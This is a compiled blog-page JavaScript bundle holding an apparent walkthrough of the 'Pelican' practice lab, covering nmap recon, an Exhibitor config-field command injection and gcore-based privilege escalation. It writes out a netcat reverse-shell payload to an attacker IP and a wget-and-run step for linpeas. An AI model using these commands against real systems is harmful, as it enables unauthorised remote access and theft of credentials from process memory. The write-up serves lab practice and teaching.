"use strict";(self.webpackChunkminimal_blog=self.webpackChunkminimal_blog||[]).push([[801],{4765:function(e,t,n){n.d(t,{F:function(){return g},Z:function(){return d}});var a=n(7294),l=n(8733),i=n(795),s=n(8377),c=n(6799),o=n(8871);var r=e=>{let{post:t}=e;return null};const p=["16px","8px","4px"].map((e=>`rgba(0, 0, 0, 0.1) 0px ${e} ${e} 0px`));var m=e=>{let{data:{post:t},children:n}=e;return(0,l.tZ)(s.Z,null,(0,l.tZ)(i.X6,{as:"h1",variant:"styles.h1"},t.title),(0,l.tZ)("p",{sx:{color:"secondary",mt:3,a:{color:"secondary"},fontSize:[1,1,2]}},(0,l.tZ)("time",null,t.date),t.tags&&(0,l.tZ)(a.Fragment,null," — ",(0,l.tZ)(c.Z,{tags:t.tags})),t.timeToRead&&" — ",t.timeToRead&&(0,l.tZ)("span",null,t.timeToRead," min read")),(0,l.tZ)("section",{sx:{my:5,".gatsby-resp-image-wrapper":{my:[4,4,5],borderRadius:"4px",boxShadow:p.join(", "),".gatsby-resp-image-image":{borderRadius:"4px"}},variant:"layout.content"}},n),(0,l.tZ)(r,{post:t}))};const g=e=>{var t,n,a;let{data:{post:i}}=e;return(0,l.tZ)(o.Z,{title:i.title,description:i.description?i.description:i.excerpt,image:i.banner?null===(t=i.banner)||void 0===t||null===(n=t.childImageSharp)||void 0===n||null===(a=n.resize)||void 0===a?void 0:a.src:void 0,pathname:i.slug,canonicalUrl:i.canonicalUrl})};function d(e){let{...t}=e;return a.createElement(m,t)}},6799:function(e,t,n){var a=n(8733),l=n(7294),i=n(1883),s=n(3494),c=n(9706);t.Z=e=>{let{tags:t}=e;const{tagsPath:n,basePath:o}=(0,s.Z)();return(0,a.tZ)(l.Fragment,null,t.map(((e,t)=>(0,a.tZ)(l.Fragment,{key:e.slug},!!t&&", ",(0,a.tZ)(i.Link,{sx:e=>{var t;return{...null===(t=e.styles)||void 0===t?void 0:t.a}},to:(0,c.Z)(`/${o}/${n}/${e.slug}`)},e.name)))))}},8871:function(e,t,n){var a=n(7294),l=n(1883),i=n(4232);t.Z=e=>{let{title:t="",description:n="",pathname:s="",image:c="",children:o=null,canonicalUrl:r=""}=e;const p=(0,i.Z)(),{siteTitle:m,siteTitleAlt:g,siteUrl:d,siteDescription:A,siteImage:u,author:h,siteLanguage:b}=p,f={title:t?`${t} | ${m}`:g,description:n||A,url:`${d}${s||""}`,image:`${d}${c||u}`};return a.createElement(a.Fragment,null,a.createElement("html",{lang:b}),a.createElement("title",null,f.title),a.createElement("meta",{name:"description",content:f.description}),a.createElement("meta",{name:"image",content:f.image}),a.createElement("meta",{property:"og:title",content:f.title}),a.createElement("meta",{property:"og:url",content:f.url}),a.createElement("meta",{property:"og:description",content:f.description}),a.createElement("meta",{property:"og:image",content:f.image}),a.createElement("meta",{property:"og:type",content:"website"}),a.createElement("meta",{property:"og:image:alt",content:f.description}),a.createElement("meta",{name:"twitter:card",content:"summary_large_image"}),a.createElement("meta",{name:"twitter:title",content:f.title}),a.createElement("meta",{name:"twitter:url",content:f.url}),a.createElement("meta",{name:"twitter:description",content:f.description}),a.createElement("meta",{name:"twitter:image",content:f.image}),a.createElement("meta",{name:"twitter:image:alt",content:f.description}),a.createElement("meta",{name:"twitter:creator",content:h}),a.createElement("meta",{name:"gatsby-theme",content:"@lekoarts/gatsby-theme-minimal-blog"}),a.createElement("link",{rel:"icon",type:"image/png",sizes:"32x32",href:(0,l.withPrefix)("/favicon-32x32.png")}),a.createElement("link",{rel:"icon",type:"image/png",sizes:"16x16",href:(0,l.withPrefix)("/favicon-16x16.png")}),a.createElement("link",{rel:"apple-touch-icon",sizes:"180x180",href:(0,l.withPrefix)("/apple-touch-icon.png")}),r?a.createElement("link",{rel:"canonical",href:r}):null,o)}},1977:function(e,t,n){n.r(t),n.d(t,{Head:function(){return c.F},default:function(){return o}});var a=n(7294),l=n(1151);function i(e){const t=Object.assign({span:"span",h1:"h1",p:"p",code:"code",pre:"pre",h2:"h2",ul:"ul",li:"li",strong:"strong",ol:"ol",a:"a"},(0,l.ah)(),e.components);return a.createElement(a.Fragment,null,a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 886px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 27.916666666666668%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAABYlAAAWJQFJUiTwAAABI0lEQVR42mWN/26CMBSFeQCHUKDlR0FLNx0CEzN1E7cFzXQme//nObvt4hKzP27Od8/9Co7KKihZoZSLf6PzmuZ2t2y76qYznmHn8+OCoT9ByxqVXuGx7NCvBxz3Z3wN3zj0ZzwULVRS4bnd4fh+wdv2gHa2Rle94EDesDvZN5unPZxEKOSZRswLpGIKmZaQiaJUf5zQTSYlMuJCakzkvX1z7YybxhPLTv+6gCqnaNoGpdbwGUNLvFp1WHZL1E2Njtgde3SnH+Q57twxXM9DJjPrNORstmvMH+f0we0MaRojLyZWHvs+uIgh4t/hZmh3qQ8jDhaGlo1n2NwjIRAnCSIu4IxGDMyP4HshfMowEGAssp3JgHGbpjccBNzydTfe1TH5A8jupatIuoTLAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="info"\n        title=""\n        src="/static/0824cfdf509e6e202e14f937c45d0df3/88662/info.png"\n        srcset="/static/0824cfdf509e6e202e14f937c45d0df3/5243c/info.png 240w,\n/static/0824cfdf509e6e202e14f937c45d0df3/ab158/info.png 480w,\n/static/0824cfdf509e6e202e14f937c45d0df3/88662/info.png 886w"\n        sizes="(max-width: 886px) 100vw, 886px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(t.h1,null,"Recon"),"\n",a.createElement(t.p,null,"Make an entry for the machine's IP in ",a.createElement(t.code,null,"/etc/hosts")," file. My entry looks like:"),"\n",a.createElement(t.pre,null,a.createElement(t.code,null,"192.168.232.98\tpelican.offsec\n")),"\n",a.createElement(t.h2,null,"Nmap"),"\n",a.createElement(t.pre,null,a.createElement(t.code,null,"nmap -p- --open -sC -sV pelican.offsec\n")),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,a.createElement(t.code,null,"-p-"),": Scans all 65535 ports on the target system. The hyphen signifies scanning all possible ports."),"\n",a.createElement(t.li,null,a.createElement(t.code,null,"--open"),": Displays only open ports, indicating which services are active and accessible. Runs scripts on these ports only."),"\n",a.createElement(t.li,null,a.createElement(t.code,null,"-sC"),": Performs default script scanning, which runs a set of scripts to gather additional information about the target."),"\n",a.createElement(t.li,null,a.createElement(t.code,null,"-sV"),": Enables version detection, providing information about the versions of services running on open ports."),"\n"),"\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 61.24999999999999%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAABYlAAAWJQFJUiTwAAACHElEQVR42k1T2bKiMBTkT7zXGVEUEALIvi8i4jJV8/+/0tMJ6tyHrkNITlef7kSL6xv2ooRIzvCIY9BipfsQ0YC4nLE7ZjBFhb1T4sBq+w0M/rPYYxxz6Gaizn/pAeFDs70C9fBE3j4g4kERHk8tnFMHJ+zVt4h6rlu4Ycf9Bh7XX7qH1cbD99ZXRApca5ZXI8wuqLs78uaOrH0qFN0fhbS+I6luyFhLueZ3O/6FH/fYWclCSKI3NHnYi884pSOSYmLzrMbKmgdVP9Xolld9lMpzgkojng3zCzaHCKvf4kUooMXFFQm9kjWjwqJ7ImBTmE/KBjniZh+pxl/GCetd8KOGPxSKhbCoZ0jk1YSAYwj6trVS5VPGwJyXZ1JZkMpJznCpVtoUMETDTqnQIZmroG3YHFKdTNRPBqXIpK8mq8XRTaZ59Ln2lmrJyj0ZggpFf6tzXyOLFE3a41xPGMoRY31BX5xZr5jaGU2++BvRLwmPU8jwtmZMZe5H2UfhrZlwrhaSgejyAamfoydRGdZw9/6iQv/v0xsfQo68ekF7NCNmks71iDvrtRrRJS3u7RV92iE/hrAOJ3xtGQKDWLOqQBR8rj2sdfGBlpVX+FEHIc0PqIhwCEHjA150g3dNYmcnOPCFyLu3l6/HLWA6OQ5Oxv2Ye4mqWlTQl6glKV8F75tHcpmszQB8EsrGHQ8atiRKFeS3JNqqO+iokd/4B/bqhzXGcvFaAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="nmap"\n        title=""\n        src="/static/694125662dc540e8cd0fd7af31c66e8b/7d769/nmap.png"\n        srcset="/static/694125662dc540e8cd0fd7af31c66e8b/5243c/nmap.png 240w,\n/static/694125662dc540e8cd0fd7af31c66e8b/ab158/nmap.png 480w,\n/static/694125662dc540e8cd0fd7af31c66e8b/7d769/nmap.png 960w,\n/static/694125662dc540e8cd0fd7af31c66e8b/87339/nmap.png 1440w,\n/static/694125662dc540e8cd0fd7af31c66e8b/814a3/nmap.png 1470w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(t.p,null,"The nmap scan shows two http ports on 8080 and 8081"),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,"on port 8080, there is a 404 error"),"\n",a.createElement(t.li,null,"port 8081 redirects to port 8080 revealing a web application"),"\n"),"\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 42.5%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAABYlAAAWJQFJUiTwAAAB/0lEQVR42m2SS09aURSFb2pt01HbRFMLVKRSQd6IigSVh7zuBaSAvFHUIlTwXmpa/0GbPpIOGkdOmnbWf/n1cCHGNB18WWuvffY+ycmRdjIFEvkySYE/vMfaVpzAbgqf8J5QjMBWjM1glKDQwMYuHm9IJ7ydJJnMk0rt35KWi0itVS81pw/F7ka2vCK9bKNsdVBYtrMv1Ga2MLdiZ962qjP2d+tbRLbi9iE1zVaai1YaYlE/mWMYTTHajqEKf7kT5zAY5ubhI37PzPLr/oN/mNX5Kfhzb4Yf8wtI6w4r646XbPvt5A4K5AsKeSWOUsqTyyaoKgk+meb4tvCEr8+f/pcvgu/PHnPxwoR0cJylrV3RHIyodY6pNOpUWy2qlSKVUpZSMYfSqiO36yjtmo481Ykf9xrIrRKe8BpSVyugXr1D/aCivR8yGh6hnrdRB4cM1B6Xoy5av4Haa3Jx1hI0hRfaa+vZuKf1RdYtEQmJNxwdx9FOYjrDToTB0S69xia9wyidjzdcX3+mW/Xz9kTmXOvz5rTM8DSvX9btZDmrb3DWCAmCbK67kJS4j1wyQC4RIBP1kI64SEfdZOJ+lOJr6hVZ1C4yMQ/ynl/k3okXc2Mdnx2TijhxOG1IhkUzxsUljOYlTEsWTOKbGHVEZjKwYDRN62mmY7mjEwxix7Jtlb/v3EAZqsTxHgAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="pelican"\n        title=""\n        src="/static/1a17bfb86c9149b70833f8b9c3943e47/7d769/pelican.png"\n        srcset="/static/1a17bfb86c9149b70833f8b9c3943e47/5243c/pelican.png 240w,\n/static/1a17bfb86c9149b70833f8b9c3943e47/ab158/pelican.png 480w,\n/static/1a17bfb86c9149b70833f8b9c3943e47/7d769/pelican.png 960w,\n/static/1a17bfb86c9149b70833f8b9c3943e47/87339/pelican.png 1440w,\n/static/1a17bfb86c9149b70833f8b9c3943e47/db602/pelican.png 1510w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(t.h1,null,"Foothold"),"\n",a.createElement(t.p,null,"First, we can see if there are any public exploits on exploitdb for the exhibitor application using searchsploit\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 20.416666666666668%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAzElEQVR42jWPa5KCMBCEvclKFQQMEHkFEkBDrS7r6v3P0/aA++Or6eqpdE8Oif2B9k+Y6Q/a3tG4FcbeoMppI849kg9KpnbIyhExZ3zqyUA9bL7oQ19f4ZoA626ougBVjMjMjLwO0NWVBOScmRQw8MRdx9KSb/R55v6y77SUMTDkDkvhGbiiHX/R+hVn+42Ouur3i8WTh6rgdWaiL/vdr4c7TLsglR9IoF9eGMIT7vJAPz9QsDlKLY6qQ/Rh0/SiVHS78ZX80+BIIrXzBkeifqSwbbwGAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="searchsploit"\n        title=""\n        src="/static/cd7c1941ec46d9865f15311e85ee447e/7d769/searchsploit.png"\n        srcset="/static/cd7c1941ec46d9865f15311e85ee447e/5243c/searchsploit.png 240w,\n/static/cd7c1941ec46d9865f15311e85ee447e/ab158/searchsploit.png 480w,\n/static/cd7c1941ec46d9865f15311e85ee447e/7d769/searchsploit.png 960w,\n/static/cd7c1941ec46d9865f15311e85ee447e/87339/searchsploit.png 1440w,\n/static/cd7c1941ec46d9865f15311e85ee447e/6e95a/searchsploit.png 1466w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,"we can download this result with ",a.createElement(t.code,null,"searchsploit -m java/webapps/48654.txt")),"\n"),"\n",a.createElement(t.p,null,"Reading this txt file shows the following steps to gain a foothold\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 23.75%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAFCAYAAABFA8wzAAAACXBIWXMAABYlAAAWJQFJUiTwAAAA5klEQVR42j2Q6W6DMBCE/SYt4WhpOGKDDeGKk5JGSqW+/9tMd4zIj0/jXdazg5U9X2Hsgra7oBtuODUTGrfAdh691JU+I/nQyHKD9FMLm7LO8ibA7+xHaQ2VF1ZMRtRmDMbGztDtFGqaU2luew8j/dZdwhyX6naWID6cCU2V7a9wkrIfvwPHqsNX6YIWdYejsJtXengpZ5iMcwxQhHsWituG+Y5GlCkIN28ph7D17VDgPS6F6qVRUuMgvxglW49KVClv5NdfrI8/9NMKf3tiXH6EO5ykpymXhTeSC3F2QpxuZjvs7ed/Yhqd/oD3yFgAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="foothold-steps"\n        title=""\n        src="/static/a3b0ff38e7eb7ad31f86963fa9091421/7d769/foothold-steps.png"\n        srcset="/static/a3b0ff38e7eb7ad31f86963fa9091421/5243c/foothold-steps.png 240w,\n/static/a3b0ff38e7eb7ad31f86963fa9091421/ab158/foothold-steps.png 480w,\n/static/a3b0ff38e7eb7ad31f86963fa9091421/7d769/foothold-steps.png 960w,\n/static/a3b0ff38e7eb7ad31f86963fa9091421/87339/foothold-steps.png 1440w,\n/static/a3b0ff38e7eb7ad31f86963fa9091421/1064d/foothold-steps.png 1468w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,"the command is a simple reverse shell using netcat"),"\n"),"\n",a.createElement(t.pre,null,a.createElement(t.code,null,"$(/bin/nc -e /bin/sh <LHOST> <LPORT> &)\n")),"\n",a.createElement(t.p,null,"Breaking down the command:"),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,a.createElement(t.code,null,"/bin/nc"),": This is the netcat command, a networking utility that can be used to create network connections"),"\n",a.createElement(t.li,null,a.createElement(t.code,null,"-e /bin/sh"),": This option tells netcat to execute the specified command (",a.createElement(t.code,null,"/bin/sh"),") after establishing a connection"),"\n",a.createElement(t.li,null,a.createElement(t.code,null,"&"),": This puts the command in the background, allowing the user to continue using the terminal while the connection is active"),"\n",a.createElement(t.li,null,a.createElement(t.code,null,"LHOST")," represents the local machine's IP address (attacker IP)"),"\n",a.createElement(t.li,null,a.createElement(t.code,null,"LPORT")," represents the local machine's port number (attacker port) that the listener will be using"),"\n"),"\n",a.createElement(t.p,null,"My LHOST is ",a.createElement(t.code,null,"192.168.45.202")," and LPORT that I will be using for my listener is ",a.createElement(t.code,null,"1234")),"\n",a.createElement(t.h2,null,"Steps"),"\n",a.createElement(t.p,null,a.createElement(t.strong,null,"In my case, I completed the following steps to gain a foothold")),"\n",a.createElement(t.ol,null,"\n",a.createElement(t.li,null,"Click on config tab, then, enable the editing switch"),"\n",a.createElement(t.li,null,"In the ",a.createElement(t.code,null,"java.env script")," field, replace the contents with ",a.createElement(t.code,null,"$(/bin/nc -e /bin/sh 192.168.45.202 1234 &)")),"\n",a.createElement(t.li,null,"Start a netcat listener on port 1234 using ",a.createElement(t.code,null,"nc -lnvp 1234")," on my kali attacker machine"),"\n",a.createElement(t.li,null,"Click Commit -> All At Once -> Ok"),"\n",a.createElement(t.li,null,"Wait for the callback"),"\n"),"\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 18.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAABYlAAAWJQFJUiTwAAAA5ElEQVR42iWPXZKCMBCEuQigu4rWroIgCSGQH0LIgvrg/S/TTmUfvqpO91R6JsnYA183hX1rcOYTahmw++mwJ9JTi/zEkBcM2bFFergjI+K7aMn71zllu4L0oUGi/RvKPtDrFca94MMbg1ojdyooqxGXa49brdAyKmw0ynIgf0BFi5Ql5TRzJu9SayTGrujEBMYMhHDg3YRezFEPYwCnT6XwxAxnnxjlAk7XSMpl79FRie4sfhuDms9I/Djj5Tb8aY9A2gkbCWrBc9rgpUOQ5HODpXeRTQVsOkQdaHaqONLvOp78ATd+g9EUgvzUAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="foothold"\n        title=""\n        src="/static/64a37db2822a032202a7650f728c15f7/7d769/foothold.png"\n        srcset="/static/64a37db2822a032202a7650f728c15f7/5243c/foothold.png 240w,\n/static/64a37db2822a032202a7650f728c15f7/ab158/foothold.png 480w,\n/static/64a37db2822a032202a7650f728c15f7/7d769/foothold.png 960w,\n/static/64a37db2822a032202a7650f728c15f7/b43a1/foothold.png 1092w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(t.p,null,"We now have a foothold as user charles"),"\n",a.createElement(t.h1,null,"Privilege Escalation"),"\n",a.createElement(t.p,null,"We can upgrade this low level shell with the following steps"),"\n",a.createElement(t.pre,null,a.createElement(t.code,null,"python -c ‘import pty;pty.spawn(“/bin/bash”);’\nexport TERM=xterm\nCtrl + z\nstty raw -echo ; fg\nreset\n")),"\n",a.createElement(t.h2,null,"Check for sudo commands"),"\n",a.createElement(t.p,null,"One of the first commands to check for user privileges includes ",a.createElement(t.code,null,"sudo -l")),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,"the ",a.createElement(t.code,null,"sudo -l")," command is used to list the allowed commands that a user can execute with sudo privileges"),"\n"),"\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 18.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAABYlAAAWJQFJUiTwAAAA2ElEQVR42lWP2U7DMBRE8yWAEE3i7HFrkmaxk7QpXVAFRfz/pwzj+8bDaMZX9vHcwJ0emM4/GNdv7OdPdMsdlrP+8IXW3rB3N+TbGWntRK+RwfNm+08v3t+0KKjaIxo+erdXmPGChpCBsKpZoaoRSWWRaUfohFxPiPJeZjE9LpjLUbKiq3JAENcjMsMGfKB4MakJYC7MIjklrDQHgaU8F7tFPojyToCqGBBmPg8Edwh0/yHt7PqAo3R7kpb9fMd8/pWmHuhbJWzsm4ZsJKuGO7qW/ORX3mj8AapKge9itsjGAAAAAElFTkSuQmCC\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="escalation-enum"\n        title=""\n        src="/static/a4e5c7dbf078cf668803aae0f7e5217c/7d769/escalation-enum.png"\n        srcset="/static/a4e5c7dbf078cf668803aae0f7e5217c/5243c/escalation-enum.png 240w,\n/static/a4e5c7dbf078cf668803aae0f7e5217c/ab158/escalation-enum.png 480w,\n/static/a4e5c7dbf078cf668803aae0f7e5217c/7d769/escalation-enum.png 960w,\n/static/a4e5c7dbf078cf668803aae0f7e5217c/a9a39/escalation-enum.png 1348w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}}),"\n",a.createElement(t.p,null,"Searching the command ",a.createElement(t.code,null,"gcore")," on ",a.createElement(t.a,{href:"https://gtfobins.github.io/gtfobins/gcore/"},"GTFOBins")," reveals the following"),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,a.createElement(t.code,null,"gcore")," generates core dumps of running processes","\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,"files that contain sensitive information like passwords, cryptographic keys etc."),"\n"),"\n"),"\n",a.createElement(t.li,null,"the binary does not drop elevated privileges and can be used to access the file system using a ",a.createElement(t.code,null,"$PID")," which is a process ID"),"\n"),"\n",a.createElement(t.h2,null,"Linpeas"),"\n",a.createElement(t.p,null,"Running linpeas will allow us to see all processes and their respective ID's"),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,"start a python listener using ",a.createElement(t.code,null,"python3 -m http.server 80")," on the kali machine in the directory with ",a.createElement(t.code,null,"linpeas.sh")),"\n",a.createElement(t.li,null,"the curl command isn't present on the machine, so use wget"),"\n"),"\n",a.createElement(t.pre,null,a.createElement(t.code,null,"wget http://<LHOST>/linpeas.sh\nchmod +x linpeas.sh\n./linpeas.sh\n")),"\n",a.createElement(t.p,null,"After running linpeas, we can look at the specific services as that is the focus of our enumeration\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 50.416666666666664%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAABYlAAAWJQFJUiTwAAACC0lEQVR42j2S63KbMBCFeZD+cBIbDEYggS5I6AIYO46TTjt9/3c5XUinP84gBPp09uxmjbuhTVfwdIM0EV2rIYxBpySM7KHoaYWCEwMkU1BMQjYanPZ4K9DzDoJ0LBUOhUKWTjVK1iGkFYMJGG2CGybUVQfVOYwmIdgItzzRKI+OKzRC48w0jheFE+lYKbycNV42oC0kKmagzQzeeYzhHdpd8ZYLMOH2tR3psvQJ/vEb7P4TF7cgZw6H0uDln17/KesbhTMfMNgFvSJ3/oaBIMecoyXgQIc3YEjvEOsvFPYJKSOYmlCKiIpHgo8oGo9z65EtP44oavUN1Ak+vsPQ+lgItN24r7cLbHxinr9wXb+gLVVjHxCkRi14q4bvkknZeGA41xqWDvUy7MANvjlkrf0P9PEOuT5hKNOGInplCW/k7FRt2em9IXtT9KFFTqHq4QrRRxi3QuoZryeOSzNADQtBr3DpgW7+gKWcWz4iry2KagNacmioMcOu7FN0NB4GcfTk0iGmiNF7GgtBbgx88KSAlBJ9C5hmytkFcDlBdnewJqCk7C6UZy0SsgeV1nODFCYKP2BeVgJM9COH0hYxzgSasV5vELc/6Kj8jmawbEZqAjWDJ1QbkId9LxMlR863rFYI6rL1973svJSoW/ddMr37+KAReqDtJ1wow6ZP5CrhJFacmEdBeeYXi7+An0Th0dKaVgAAAABJRU5ErkJggg==\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="process-id"\n        title=""\n        src="/static/c8d79407b74807b0849adae04115b73c/7d769/process-id.png"\n        srcset="/static/c8d79407b74807b0849adae04115b73c/5243c/process-id.png 240w,\n/static/c8d79407b74807b0849adae04115b73c/ab158/process-id.png 480w,\n/static/c8d79407b74807b0849adae04115b73c/7d769/process-id.png 960w,\n/static/c8d79407b74807b0849adae04115b73c/87339/process-id.png 1440w,\n/static/c8d79407b74807b0849adae04115b73c/88b03/process-id.png 1920w,\n/static/c8d79407b74807b0849adae04115b73c/d0344/process-id.png 2144w"\n        sizes="(max-width: 960px) 100vw, 960px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,"the process ID 493 looks promising"),"\n",a.createElement(t.li,null,"try to dump this process ID using the ",a.createElement(t.code,null,"gcore")," command"),"\n"),"\n",a.createElement(t.p,null,"Running the command shows you the usage details\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 902px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 12.916666666666664%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAYAAACTWi8uAAAACXBIWXMAABYlAAAWJQFJUiTwAAAAoUlEQVR42k1OSw6CQBTjKgjqSoLymR/gMDCIGBPj/e9SOxiJi6Z5aV/bSCkH75+olIcwE8qyRS17XO0dtbDQZkRVW5jGI8sV4uSEJM2wI/8Q/3FUMKDtbrD9wucBggWSUAwSDG6C5hbMy/ur6YHBGukhx/543hDuAzkKhml+QXOBasbtyQ4PVFwotVu5szMKLg2QLAtFpp1Wv5AOFw4T2uEDehxjKUdyZeoAAAAASUVORK5CYII=\'); background-size: cover; display: block;"\n  ></span>\n  <img\n        class="gatsby-resp-image-image"\n        alt="gcore"\n        title=""\n        src="/static/29e8ebf978480013e46f4f038e4a712a/0dc17/gcore.png"\n        srcset="/static/29e8ebf978480013e46f4f038e4a712a/5243c/gcore.png 240w,\n/static/29e8ebf978480013e46f4f038e4a712a/ab158/gcore.png 480w,\n/static/29e8ebf978480013e46f4f038e4a712a/0dc17/gcore.png 902w"\n        sizes="(max-width: 902px) 100vw, 902px"\n        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"\n        loading="lazy"\n        decoding="async"\n      />\n    </span>'}})),"\n",a.createElement(t.p,null,"The final command looks like:"),"\n",a.createElement(t.pre,null,a.createElement(t.code,null,"sudo gcore -o <outputfile> 493\n")),"\n",a.createElement(t.ul,null,"\n",a.createElement(t.li,null,"note: the process id may be different on your machine instance"),"\n"),"\n",a.createElement(t.p,null,"The output file is not readable when using ",a.createElement(t.code,null,"nano")," to view the contents\n",a.createElement(t.span,{dangerouslySetInnerHTML:{__html:'<span\n      class="gatsby-resp-image-wrapper"\n      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 960px; "\n    >\n      <span\n    class="gatsby-resp-image-background-image"\n    style="padding-bottom: 61.24999999999999%; position: relative; bottom: 0; left: 0; background-image: 